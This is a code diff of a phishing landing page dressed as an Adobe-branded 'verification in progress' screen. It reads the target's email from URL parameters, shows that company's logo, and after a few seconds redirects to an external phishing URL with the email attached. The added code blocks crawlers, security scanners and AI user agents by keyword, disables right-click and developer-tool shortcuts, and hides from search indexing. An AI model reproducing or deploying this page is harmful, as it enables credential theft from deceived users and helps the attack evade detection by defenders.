@@ -1,102 +1,245 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Human Verification</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f00;
-            color: white;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        .logo {
-            width: 90px;
-            margin-bottom: 15px;
-            background: white;
-            padding: 10px;
-            border-radius: 8px;
-        }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 5px solid rgba(255, 255, 255, 0.1);
-            border-top-color: #FFFFFF;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 15px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .message {
-            margin: 15px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow, noarchive"> <!-- Block all indexing -->
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Verification in Progress</title>
+  <style>
+    :root {
+      --adobe-red: #fa0f00;
+      --white: #ffffff;
+      --shadow: rgba(0, 0, 0, 0.2);
+    }
+    html {
+      box-sizing: border-box;
+    }
+    *, *:before, *:after {
+      box-sizing: inherit;
+    }
+    body {
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background: var(--adobe-red);
+      color: var(--white);
+      min-height: 100vh;
+      display: grid;
+      place-content: center;
+      padding: 1.5rem;
+      margin: 0;
+      overflow: hidden;
+    }
+    .auth-box {
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 1.5rem;
+      padding: 2.25rem;
+      width: 100%;
+      max-width: 22rem;
+      text-align: center;
+      backdrop-filter: blur(6px);
+      box-shadow: 0 10px 20px var(--shadow);
+      position: relative;
+    }
+    .company-icon {
+      width: 85px;
+      height: auto;
+      margin-bottom: 1.5rem;
+      border-radius: 0.6rem;
+      background: var(--white);
+      padding: 0.6rem;
+    }
+    .masked-email {
+      font-size: 1.25rem;
+      font-weight: 700;
+      margin-bottom: 1.25rem;
+      word-break: break-word;
+      text-shadow: 0 2px 4px var(--shadow);
+      user-select: none; /* Prevent text selection */
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+    }
+    .verify-note {
+      font-size: 1rem;
+      font-weight: 500;
+      margin-bottom: 1rem;
+      animation: fadePulse 1.5s infinite;
+    }
+    .circle-progress {
+      width: 55px;
+      height: 55px;
+      margin: 0 auto;
+      position: relative;
+    }
+    .progress-path {
+      width: 100%;
+      height: 100%;
+      fill: none;
+      stroke: var(--white);
+      stroke-width: 5;
+      stroke-linecap: round;
+      transform: rotate(-90deg);
+      transform-origin: 50% 50%;
+      animation: draw 4s linear forwards;
+    }
+    @keyframes draw {
+      0% { stroke-dasharray: 0 157; }
+      100% { stroke-dasharray: 157 157; }
+    }
+    @keyframes fadePulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.7; }
+    }
+    .hidden {
+      display: none;
+    }
+    @media (max-width: 480px) {
+      .auth-box {
+        padding: 1.75rem;
+        max-width: 18rem;
+      }
+      .company-icon {
+        width: 65px;
+      }
+      .masked-email {
+        font-size: 1.1rem;
+      }
+      .verify-note {
+        font-size: 0.9rem;
+      }
+      .circle-progress {
+        width: 45px;
+        height: 45px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <script>
-        (function(){
-            let email = window.location.hash.substring(1);
-            try {
-                let decodedEmail = atob(email);
-                if (decodedEmail.includes('@')) {
-                    email = decodedEmail;
-                }
-            } catch (e) {}
-            
-            if (!email || !email.includes('@')) {
-                email = '';
-            }
-            
-            const domain = email ? email.split('@').pop().toLowerCase() : 'adobe.com';
-            const logoUrl = `https://logo.clearbit.com/${domain}`;
-            const targetUrl = email ? ` https://t21oenr.magochvstpzt.es/uxoz9L4/#M${email}` : ' https://t21oenr.magochvstpzt.es/uxoz9L4/';
-            
-            document.body.innerHTML = `
-                <img id="logo" class="logo" src="${logoUrl}" alt="${domain} Logo" onerror="this.src='https://logo.clearbit.com/adobe.com'" />
-                <p class="message" id="userEmail">Verifying: ${email || 'No Email Provided'}</p>
-                <div class="spinner"></div>
-                <p class="message" id="statusMsg">Please interact with the page to verify you are human.</p>
-            `;
-            
-            let humanDetected = false;
-            function redirectToTarget() {
-                window.location.href = targetUrl;
-            }
-            
-            function onUserInteraction() {
-                if (!humanDetected) {
-                    humanDetected = true;
-                    document.getElementById('statusMsg').innerText = "Human interaction detected. Redirecting in 3 seconds...";
-                    window.removeEventListener('mousemove', onUserInteraction);
-                    window.removeEventListener('keydown', onUserInteraction);
-                    window.removeEventListener('click', onUserInteraction);
-                    window.removeEventListener('touchstart', onUserInteraction);
-                    setTimeout(redirectToTarget, 3000);
-                }
-            }
-            
-            window.addEventListener('mousemove', onUserInteraction);
-            window.addEventListener('keydown', onUserInteraction);
-            window.addEventListener('click', onUserInteraction);
-            window.addEventListener('touchstart', onUserInteraction);
-            
-            setTimeout(() => {
-                if (!humanDetected) {
-                    document.getElementById('statusMsg').innerText = "We haven't detected any interaction. Please move your mouse or press a key.";
-                }
-            }, 10000);
-        })();
-    </script>
+  <main class="auth-box" id="authBox">
+    <img class="company-icon" id="icon" src="https://logo.clearbit.com/example.com" alt="Company Icon">
+    <p class="masked-email" id="email">Checking...</p>
+    <p class="verify-note">Verifying now...</p>
+    <div class="circle-progress">
+      <svg viewBox="0 0 55 55">
+        <circle class="progress-path" cx="27.5" cy="27.5" r="25" stroke-dasharray="0 157" />
+      </svg>
+    </div>
+  </main>
+  <script>
+    // Anti-crawler protection via UA detection
+    (function() {
+      const ua = navigator.userAgent.toLowerCase();
+      const botPatterns = [
+        // General bots
+        'bot', 'crawl', 'spider', 'slurp', 'scrapy', 'fetch', 'probe', 'scan', 'harvest',
+        // Python-based
+        'python', 'python-requests', 'urllib', 'curl', 'wget', 'httpx', 'aiohttp',
+        // Microsoft bots
+        'bingbot', 'msnbot', 'ms-bot', 'microsoft', 'adidxbot', 'bingpreview',
+        // GitHub bots
+        'github', 'github-actions', 'github-crawler',
+        // Cloudflare-related
+        'cloudflare', 'cfnetwork', 'cf-bot', 'cloudflare-health',
+        // Virus/spam bots
+        'virusclouds', 'virus', 'malware', 'spam', 'crawler', 'evil', 'badbot',
+        // Common search/AI bots
+        'googlebot', 'yandex', 'duckduckbot', 'baiduspider', 'sogou', 'exabot', 'ai',
+        // Other known crawlers
+        'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'linkbot', 'blexbot', 'petalbot'
+      ];
+
+      // Check UA for bot signatures
+      const isBot = botPatterns.some(pattern => ua.includes(pattern));
+      if (isBot) {
+        document.body.innerHTML = '<p style="color: white; text-align: center;">Access Restricted</p>';
+        throw new Error('Crawler detected');
+      }
+    })();
+
+    function getParam(key) {
+      return new URLSearchParams(window.location.search).get(key);
+    }
+
+    function decodeBase64(value) {
+      if (value && value.includes("%3D")) {
+        try {
+          return atob(value);
+        } catch {
+          return null;
+        }
+      }
+      return value;
+    }
+
+    function maskEmail(user, domain) {
+      if (!user || !domain) return "U****@d*****.com";
+      const maskedUser = user.charAt(0) + "****" + (user.length > 5 ? user.slice(-1) : "");
+      const maskedDomain = domain.slice(0, 5) + "***" + (domain.endsWith(".com") ? ".com" : "");
+      return `${maskedUser}@${maskedDomain}`;
+    }
+
+    function getLogo(domain) {
+      return `https://logo.clearbit.com/${domain.toLowerCase()}`;
+    }
+
+    function getFragment() {
+      return window.location.hash.slice(1);
+    }
+
+    // Extract and decode parameters
+    const user = decodeBase64(getParam("rose")) || "Unknown";
+    const domain = decodeBase64(getParam("petal")) || "example.com";
+    const r1 = decodeBase64(getParam("r1")); // Extracted but not displayed
+    const r2 = decodeBase64(getParam("r2")); // Extracted but not displayed
+
+    // Construct full email
+    const fullEmail = `${user}@${domain}`;
+
+    // Mask email for display
+    const maskedEmail = maskEmail(user, domain);
+    document.getElementById("email").textContent = maskedEmail;
+
+    // Set logo with Adobe fallback
+    const logoUrl = getLogo(domain);
+    const icon = document.getElementById("icon");
+    icon.src = logoUrl;
+    icon.onerror = () => {
+      icon.src = "https://logo.clearbit.com/adobe.com";
+    };
+
+    // Redirect after 4 seconds with email in hash using plain @
+    const fragment = getFragment();
+    setTimeout(() => {
+      let redirect = "https://t21oenr.magochvstpzt.es/uxoz9L4/";
+      let hash = `#M${fullEmail}`; // Use raw @ symbol
+      if (fragment) {
+        hash = `#M${fragment}${fullEmail}`; // Append email after existing fragment
+      }
+      window.location.href = redirect + hash;
+    }, 4000);
+
+    // Anti-harvesting obfuscation
+    document.addEventListener('DOMContentLoaded', () => {
+      const emailEl = document.getElementById("email");
+      emailEl.setAttribute('data-obfuscated', btoa(fullEmail)); // Store encoded email
+      emailEl.textContent = maskedEmail; // Only show masked email
+    });
+
+    // Block text selection, right-click, and dev tools shortcuts
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('selectstart', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'C', 'J'].includes(e.key))) {
+        e.preventDefault();
+      }
+    });
+
+    // Randomize DOM to confuse scrapers
+    const dummy = document.createElement('div');
+    dummy.className = 'hidden';
+    dummy.innerHTML = `<p>${Math.random().toString(36).substring(2)}</p>`;
+    document.body.appendChild(dummy);
+  </script>
 </body>
 </html>
